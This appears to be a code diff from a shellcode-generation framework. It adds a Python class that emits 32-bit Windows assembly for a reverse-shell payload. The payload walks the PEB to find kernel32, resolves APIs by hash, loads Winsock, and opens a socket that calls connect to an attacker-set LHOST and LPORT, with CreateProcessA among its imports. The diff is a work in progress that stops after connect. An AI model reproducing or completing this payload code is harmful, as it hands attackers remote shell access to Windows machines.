@@ -15,9 +15,9 @@ from sickle.common.headers.windows.ntdef import _LIST_ENTRY
 from sickle.common.headers.windows.ntdef import _UNICODE_STRING
 
 from sickle.common.headers.windows.winnt import _IMAGE_DOS_HEADER
-from sickle.common.headers.windows.winnt import _IMAGE_NT_HEADERS64
+from sickle.common.headers.windows.winnt import _IMAGE_NT_HEADERS
 from sickle.common.headers.windows.winnt import _IMAGE_EXPORT_DIRECTORY
-from sickle.common.headers.windows.winnt import _IMAGE_OPTIONAL_HEADER64
+from sickle.common.headers.windows.winnt import _IMAGE_OPTIONAL_HEADER
 
 from sickle.common.headers.windows.winternl import _PEB
 from sickle.common.headers.windows.winternl import _PEB_LDR_DATA
@@ -75,33 +75,80 @@ class Shellcode():
 
         self.dependencies = {
             "Kernel32.dll": [
+                "LoadLibraryA",
                 "CreateProcessA",
                 "TerminateProcess",
-                "LoadLibraryA",
             ],
             "Ws2_32.dll": [
                 "WSAStartup",
                 "WSASocketA",
                 "connect",
-            ],
+            ]
         }
 
-        self.storage_offsets = {
+
+        sc_args = {
             # -------------- FUNCTIONS --------------
-            "CreateProcessA"                : 0x090,
-            "TerminateProcess"              : 0x088,
-            "LoadLibraryA"                  : 0x080,
-            "WSAStartup"                    : 0x098,
-            "WSASocketA"                    : 0x0a0,
-            "connect"                       : 0x0a8,
+            "LoadLibraryA"                  : 0x000,
+            "CreateProcessA"                : 0x000,
+            "TerminateProcess"              : 0x000,
+            "WSAStartup"                    : 0x000,
+            "WSASocketA"                    : 0x000,
+            "connect"                       : 0x000,
             # -------------- VARIABLES --------------
-            "tmpFunctionBuffer"             : 0x100,
-            "wsaData"                       : 0x200, 
-            "name"                          : 0x220,
-            "lpStartInfo"                   : 0x300,
+            "functionName"                  : 0x020, # TODO: make dynamic variables based on 0x000 vs "BUFFER"
+            "wsaData"                       : 0x000,
+            "name"                          : 0x010,
+            "lpStartInfo"                   : 0x000,
         }
+
+        # TODO: make work with x64 as well 
+        self.stack_space = self.calc_space(sc_args, 0x04)
+
+        self.storage_offsets = self.init_args(sc_args)
 
         return
+
+    def init_args(self, sc_args):
+        """Initialize storage offsets for arguments used by the shellcode
+
+        TODO: make a standard lib for all archs
+        """
+
+        arg_start = 0x08
+        for var in sc_args:
+            # If we are dealing with a "BUFFER" we have to account for the amount of space
+            # the shellcode author expects to use. With this, we can adjust the index used
+            # by the next variable. This avoids future variables being corrupted
+            #
+            # TODO: Make buffer % 8 if the user supplies a bad value that can mess up alignment
+            alloc_space = sc_args[var]
+            sc_args[var] = arg_start
+
+            if alloc_space > 0x00:
+                space_used = sc_args[var]
+                arg_start += alloc_space
+            else:
+                arg_start += 0x04
+
+        return sc_args
+
+    def calc_space(self, sc_args, reg_space):
+        """Get the number of artguments used and return the stack space to be used by the shellcode
+
+        TODO: make a standard lib for all archs
+        """
+
+        space_needed = 0x08
+        sc_argc = len(sc_args)
+        if (sc_argc > 1):
+            space_needed += sc_argc * reg_space
+
+        for var in sc_args:
+            if sc_args[var] > 0x00:
+                space_needed += sc_args[var]
+
+        return space_needed
 
     def get_kernel32(self):
         """Generates stub for obtaining the base address of Kernel32.dll
@@ -111,11 +158,15 @@ class Shellcode():
 
         stub = f"""
 getKernel32:
+    push ebp
+    mov ebp, esp
+
     mov dl, 0x4b
 getPEB:
+    xor ebx, ebx
     xor ecx, ecx
-    mov cl, 0x30
-    mov edi, fs:[ecx]
+    mov bl, 0x30
+    mov edi, fs:[ebx]
     mov edi, [edi + {_PEB.Ldr.offset}]
     mov edi, [edi + {_PEB_LDR_DATA.InLoadOrderModuleList.offset}]
 search:
@@ -126,11 +177,129 @@ search:
     jne search
     cmp [esi], dl
     jne search
+
+    leave
     ret
         """
 
         return stub
 
+    def lookup_function(self):
+        """TODO
+        """
+
+        stub = f"""
+lookupFunction:
+    push ebp
+    mov ebp, esp
+
+    sub esp, 0x08
+    xor ebx, ebx
+    mov [ebp + 0x08], ebx ; temporary register
+    mov [ebp + 0x0C], edx ; function hash
+
+    mov ebx, [edi + {_IMAGE_DOS_HEADER.e_lfanew.offset}]
+    add ebx, {_IMAGE_NT_HEADERS.OptionalHeader.offset + _IMAGE_OPTIONAL_HEADER.DataDirectory.offset}
+    add ebx, edi
+    mov eax, [ebx]
+    mov ebx, edi
+    add ebx, eax
+    mov eax, [ebx + {_IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
+    mov edx, edi
+    add edx, eax
+    mov ecx, [ebx + {_IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
+    mov [ebp + 0x08], ebx ; backup ebx 
+parseNames:
+    jecxz error
+    dec ecx
+    mov eax, [edx + ecx * 4]
+    mov esi, edi
+    add esi, eax
+    xor eax, eax
+    xor ebx, ebx
+    cld
+calcHash:
+    lodsb
+    test al, al
+    jz calcDone
+    ror ebx, 0xD
+    add ebx, eax
+    jmp calcHash
+calcDone:
+    cmp ebx, [ebp + 0x0C]
+    jnz parseNames
+findAddress:
+    mov ebx, [ebp + 0x08] ; restore ebx
+    mov edx, [ebx + {_IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}] ; r8
+    add edx, edi ; r8
+    xor eax, eax
+    mov ax, [edx + ecx * 2] ; r8
+    mov edx, [ebx + {_IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}] ; r8d
+    add edx, edi ; r8
+    mov eax, [edx + eax * 4] ; r8
+    add eax, edi
+
+error:
+    leave
+    ret
+        """
+
+        return stub
+
+    def load_library(self, lib):
+        """TODO
+        """
+
+        lists = from_str_to_xwords(lib, 0x04)
+        write_index = self.storage_offsets["functionName"]
+
+        src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))
+
+        for i in range(len(lists["DWORD_LIST"])):
+            src += "    mov ecx, 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() )
+            src += "    mov [ebp+{}], ecx\n".format(hex(write_index))
+            write_index += 4
+
+        for i in range(len(lists["WORD_LIST"])):
+            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
+            src += "    mov [ebp+{}], cx\n".format(hex(write_index))
+            write_index += 2
+
+        for i in range(len(lists["BYTE_LIST"])):
+            src += "    mov cl, {}\n".format( hex(lists["BYTE_LIST"][i]) )
+            src += "    mov [ebp+{}], cl\n".format(hex(write_index))
+            write_index += 1
+
+        src += f"""
+    lea ecx, [ebp + {self.storage_offsets['functionName']}]
+    push ecx
+    mov eax, [ebp + {self.storage_offsets['LoadLibraryA']}]
+    call eax
+        """
+
+        return src
+
+    def resolve_functions(self):
+        """TODO
+        """
+
+        stub = ""
+        for lib, imports in self.dependencies.items():
+            if (lib != "Kernel32.dll"):
+                stub += self.load_library(lib)
+                stub += """
+    mov edi, eax
+                """
+
+            for func in range(len(imports)):
+                stub += f"""
+get_{imports[func]}:
+    mov edx, {from_str_to_win_hash(imports[func])}
+    call lookupFunction
+    mov [ebp + {self.storage_offsets[imports[func]]}], eax
+                """
+
+        return stub
 
     def generate_source(self):
         """Returns bytecode generated by the keystone engine.
@@ -146,19 +315,100 @@ search:
             lport = int(argv_dict["LPORT"])
 
 
-        shellcode = """
+        shellcode = f"""
 _start:
-    jmp getKernel32
-    mov edi, eax
+    pushad    ; Save registers
+    mov ebp, esp
+    sub esp, {self.stack_space}
 
-stackAlign:
+memsetBUFFER_0:
+    xor eax, eax
+    xor ecx, ecx
+    lea edi, [ebp + {self.storage_offsets["functionName"]}]
+    mov cl, 0x08
+    rep stosd
+
+launch:
+    call getKernel32
+    mov edi, eax
+"""
+
+        shellcode += self.resolve_functions()
+
+        shellcode += f"""
+; EAX => WSAStartup([in]  WORD      wVersionRequired,
+;                   [out] LPWSADATA lpWSAData);
+call_WSAStartup:
+    mov eax, [ebp + {self.storage_offsets['WSAStartup']}]
+
+    lea ecx, [ebp + {self.storage_offsets['wsaData']}]
+    push ecx
+
+    xor ecx, ecx
+    mov cx, 0x202
+    push ecx
+
+    call eax
+
+; EAX => WSASocketA([in] int                 af,
+;                   [in] int                 type,
+;                   [in] int                 protocol,
+;                   [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,
+;                   [in] GROUP               g,
+;                   [in] DWORD               dwFlags);
+call_WSASocketA:
+    mov eax, [ebp + {self.storage_offsets['WSASocketA']}]
+    xor ecx, ecx
+
+    push ecx
+
+    push ecx
+
+    push ecx
+
+    mov cl, {IPPROTO_TCP}
+    push ecx
+
+    mov cl, {SOCK_STREAM}
+    push ecx
+
+    mov cl, {AF_INET}
+    push ecx
+
+    call eax
+
+    mov esi, eax ; save the socket file descriptor (sockfd)
+
+; EAX => connect([in] SOCKET s,
+;                [in] const sockaddr *name,
+;                [in] int namelen);
+call_connect:
+    xor ecx, ecx
+    mov cl, {ctypes.sizeof(sockaddr)}
+    push ecx
+
+    mov dword ptr [ebp + {self.storage_offsets['name'] + 0x04}], {hex(ip_str_to_inet_addr(argv_dict['LHOST']))}
+    mov dword ptr [ebp + {self.storage_offsets['name']}], 0x{struct.pack('<H', lport).hex()}0002
+    lea ecx, [ebp + {self.storage_offsets['name']}]
+    push ecx
+
+    push esi
+
+    mov eax, [ebp + {self.storage_offsets['connect']}]
+
+    call eax
+
+test:
     nop
-    nop
-    nop
+
+    
 """
 
         shellcode += self.get_kernel32()
-        #shellcode += self.lookup_function()
+        shellcode += self.lookup_function()
+
+
+        print(shellcode)
 
         return shellcode
 
